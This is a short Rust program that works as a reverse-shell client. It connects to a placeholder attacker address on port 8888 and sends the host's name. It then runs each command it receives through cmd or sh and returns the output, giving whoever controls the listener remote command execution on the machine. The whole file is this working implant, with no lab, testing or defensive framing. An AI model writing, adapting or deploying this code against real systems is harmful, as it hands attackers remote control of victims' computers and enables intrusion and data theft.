use std::process::{Command};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

#[tokio::main]
async fn main() -> std::io::Result<()> {
    let mut socket = TcpStream::connect("CHANGE/IP/HERE:8888").await?;

    let hostname = get_hostname();
    socket.write_all(hostname.as_bytes()).await?;

    let mut buffer = vec![0; 1024];

    loop {
        let n = socket.read(&mut buffer).await?;
        if n == 0 {
            break;
        }
        let command = String::from_utf8_lossy(&buffer[..n]).to_string();
        println!("Received command: {}", command);

        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(&["/C", &command])
                .output()
                .expect("Failed to execute command")
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(&command)
                .output()
                .expect("Failed to execute command")
        };

        let result = String::from_utf8_lossy(&output.stdout);
        socket.write_all(result.as_bytes()).await?;
        let confirmation_message = format!("Command '{}' executed successfully", command.trim());
        socket.write_all(confirmation_message.as_bytes()).await?;
    }

    Ok(())
}

fn get_hostname() -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("hostname")
            .output()
            .expect("Failed to get hostname")
    } else {
        Command::new("hostname")
            .output()
            .expect("Failed to get hostname")
    };

    String::from_utf8_lossy(&output.stdout).trim().to_string()
}
